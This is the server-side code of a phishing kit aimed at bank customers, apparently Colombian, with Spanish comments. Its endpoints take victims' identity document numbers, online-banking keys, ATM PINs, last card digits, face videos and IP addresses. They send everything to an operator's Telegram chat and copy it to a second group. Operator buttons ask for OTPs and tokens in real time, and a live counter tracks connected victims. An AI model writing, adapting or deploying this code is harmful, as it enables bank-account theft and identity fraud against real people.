// Importa los módulos necesarios
const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const multer = require('multer');
const fs = require('fs');
const FormData = require('form-data');

// Carga las variables de entorno
dotenv.config();

// ==================== HELPER PARA REENVIAR TODO ====================
async function forwardToSecondGroup(token, from_chat_id, message_id, target_chat_id) {
    if (!target_chat_id) return; // si no hay segundo grupo configurado, no hace nada

    try {
        await fetch(`https://api.telegram.org/bot${token}/forwardMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: target_chat_id,
                from_chat_id: from_chat_id,
                message_id: message_id
            })
        });
        console.log(`✅ Reenviado automáticamente al grupo 2 → message_id: ${message_id}`);
    } catch (error) {
        console.error('❌ Error al reenviar al grupo 2:', error.message);
    }
}

// Configuración de Multer para videos en memoria
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Crea la app
const app = express();
const http = require('http');
const server = http.createServer(app);

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ==================== ENDPOINT: Mensaje de texto ====================
app.post('/api/send-message', async (req, res) => {
    const { text, keyboard } = req.body;

    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;
    const chat_id2 = process.env.TELEGRAM_CHAT_ID_2;   // ← NUEVO

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Variables de Telegram no configuradas.' });
    }
    if (!text) {
        return res.status(400).json({ error: 'El texto es requerido.' });
    }

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = rawIp ? rawIp.replace('::ffff:', '') : 'Unknown';

    const textWithIp = `${text}\n\n<b>🌐 IP:</b> <code>${clientIp}</code>`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chat_id,
                text: textWithIp,
                parse_mode: 'HTML',
                reply_markup: keyboard,
            }),
        });

        const data = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error:', data);
            return res.status(response.status).json(data);
        }

        // ←←← REENVÍO AUTOMÁTICO
        if (data.ok) {
            const messageId = data.result.message_id;
            forwardToSecondGroup(token, chat_id, messageId, chat_id2);
        }

        res.status(response.status).json(data);
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        res.status(500).json({ error: 'Error interno del servidor.' });
    }
});

// ==================== ENDPOINT: Video biométrico ====================
app.post('/api/send-video', upload.single('video'), async (req, res) => {
    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;
    const chat_id2 = process.env.TELEGRAM_CHAT_ID_2;   // ← NUEVO

    console.log('Recibiendo video...');

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Variables de Telegram no configuradas.' });
    }
    if (!req.file || !req.file.buffer) {
        return res.status(400).json({ error: 'No se recibió video.' });
    }

    let loginData = {};
    try {
        loginData = req.body.loginData ? JSON.parse(req.body.loginData) : {};
    } catch (e) {}

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const clientIp = rawIp ? rawIp.replace('::ffff:', '') : 'Desconocida';

    try {
        const originalFilename = req.file.originalname || 'face-scan.webm';
        const isMP4 = originalFilename.endsWith('.mp4');
        const filename = isMP4 ? 'face-scan.mp4' : 'face-scan.webm';
        const contentType = isMP4 ? 'video/mp4' : 'video/webm';

        const formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('video', req.file.buffer, { filename, contentType });

        // Caption
        let caption = `<b>🎥 VIDEO BIOMÉTRICO - BOGOTÁ 🎥</b>\n\n`;
        if (loginData.identificationType) caption += `<b>🆔 Tipo Doc:</b> ${loginData.identificationType}\n`;
        if (loginData.identificationNumber) caption += `<b>👤 Documento:</b> <code>${loginData.identificationNumber}</code>\n`;
        if (loginData.secureKey && loginData.secureKey !== 'N/A') caption += `<b>🔑 Clave Segura:</b> <code>${loginData.secureKey}</code>\n`;
        if (loginData.debitCardKey && loginData.debitCardKey !== 'N/A') caption += `<b>🔑 Clave Cajero:</b> <code>${loginData.debitCardKey}</code>\n`;
        if (loginData.last4Digits && loginData.last4Digits !== 'N/A') caption += `<b>🔢 Últimos 4:</b> <code>${loginData.last4Digits}</code>\n`;
        caption += `\n<b>🌐 IP:</b> <code>${clientIp}</code>\n`;
        caption += `<b>📅 Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;

        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');

        const keyboard = {
            inline_keyboard: [
                [{ text: "❌ Error Cara", callback_data: `error_face:N/A` }],
                [{ text: "🔢 Pedir OTP", callback_data: `pedir_otp:N/A` }, { text: "💎 Pedir Token", callback_data: `pedir_token:N/A` }],
                [{ text: "🚨 Finalizar", callback_data: `finalizar:N/A` }]
            ]
        };
        formData.append('reply_markup', JSON.stringify(keyboard));

        formData.submit(`https://api.telegram.org/bot${token}/sendVideo`, (err, response) => {
            let responseData = '';
            response.on('data', chunk => responseData += chunk);
            response.on('end', () => {
                try {
                    const data = JSON.parse(responseData);
                    if (data.ok) {
                        console.log('Video enviado, messageId:', data.result.message_id);
                        
                        // ←←← REENVÍO AUTOMÁTICO DEL VIDEO
                        const messageId = data.result.message_id;
                        forwardToSecondGroup(token, chat_id, messageId, chat_id2);

                        res.json({ success: true, messageId });
                    } else {
                        console.error('Telegram Video Error:', data);
                        res.status(500).json({ error: 'Error al enviar video', details: data });
                    }
                } catch (parseErr) {
                    console.error('Error parseando respuesta:', parseErr);
                    res.status(500).json({ error: 'Error procesando respuesta de Telegram' });
                }
            });
            response.on('error', err => {
                console.error('Error respuesta:', err);
                res.status(500).json({ error: 'Error de conexión' });
            });
            if (err) {
                console.error('Error form-data:', err);
                res.status(500).json({ error: 'Error enviando video' });
            }
        });

    } catch (error) {
        console.error('Error procesando video:', error);
        res.status(500).json({ error: 'Error interno al procesar video' });
    }
});

// ==================== ENDPOINT: Check update (botones) ====================
app.get('/api/check-update/:messageId', async (req, res) => {
    const { messageId } = req.params;
    const token = process.env.TELEGRAM_TOKEN;
    const chat_id = process.env.TELEGRAM_CHAT_ID;
    const chat_id2 = process.env.TELEGRAM_CHAT_ID_2;   // ← NUEVO

    if (!token || !chat_id) {
        return res.status(500).json({ error: 'Variables no configuradas.' });
    }

    let updateFound = false;
    const startTime = Date.now();
    const timeout = 55000;
    let lastUpdateId = 0;

    while (Date.now() - startTime < timeout && !updateFound) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}&limit=1`);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                const relevantUpdate = data.result.find(
                    update => update.callback_query && update.callback_query.message.message_id == messageId
                );

                lastUpdateId = data.result[data.result.length - 1].update_id;

                if (relevantUpdate) {
                    updateFound = true;
                    const callbackQuery = relevantUpdate.callback_query;
                    const action = callbackQuery.data.split(':')[0];
                    const user = callbackQuery.from;
                    const userName = user.username ? `@${user.username}` : `${user.first_name} ${user.last_name || ''}`.trim();

                    await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ callback_query_id: callbackQuery.id })
                    });

                    await fetch(`https://api.telegram.org/bot${token}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] }
                        })
                    });

                    // Notificación
                    const notificationText = `${userName} eligió la acción: ${action}.`;
                    const notifResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chat_id,
                            text: notificationText,
                        })
                    });

                    const notifData = await notifResponse.json();

                    // ←←← REENVÍO AUTOMÁTICO DE LA NOTIFICACIÓN
                    if (notifData.ok) {
                        forwardToSecondGroup(token, chat_id, notifData.result.message_id, chat_id2);
                    }

                    return res.json({ action });
                }
            }
        } catch (error) {
            console.error('Error polling:', error);
            await new Promise(r => setTimeout(r, 5000));
        }
        if (!updateFound) await new Promise(r => setTimeout(r, 2000));
    }

    return res.status(408).json({ error: 'Timeout: No se recibió respuesta.' });
});

// ==================== SOCKET.IO ====================
const { Server } = require('socket.io');
const io = new Server(server, { cors: { origin: '*' } });

const connected = new Map();
let totalVisits = 0;
const recentVisits = [];

io.on('connection', (socket) => {
    const now = Date.now();
    connected.set(socket.id, { connectedAt: now });
    totalVisits++;
    recentVisits.unshift({ id: socket.id, at: now });
    if (recentVisits.length > 200) recentVisits.length = 200;

    const onlineCount = connected.size;
    const stats = {
        online: onlineCount,
        totalVisits,
        recentVisits: recentVisits.slice(0, 100),
        clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
    };

    io.emit('stats', stats);
    io.emit('count', onlineCount);
    io.emit('details', { count: onlineCount, clients: stats.clients });

    socket.on('request-details', () => {
        const current = connected.size;
        socket.emit('details', {
            count: current,
            clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
        });
    });

    socket.on('disconnect', () => {
        connected.delete(socket.id);
        const newCount = connected.size;
        const statsAfter = {
            online: newCount,
            totalVisits,
            recentVisits: recentVisits.slice(0, 100),
            clients: Array.from(connected.entries()).map(([id, info]) => ({ id, connectedAt: info.connectedAt }))
        };
        io.emit('stats', statsAfter);
        io.emit('count', newCount);
        io.emit('details', { count: newCount, clients: statsAfter.clients });
    });
});

// Ruta catch-all para SPA
app.get(/.*/, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

module.exports = app;

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
    server.listen(PORT, () => {
        console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
    });
}
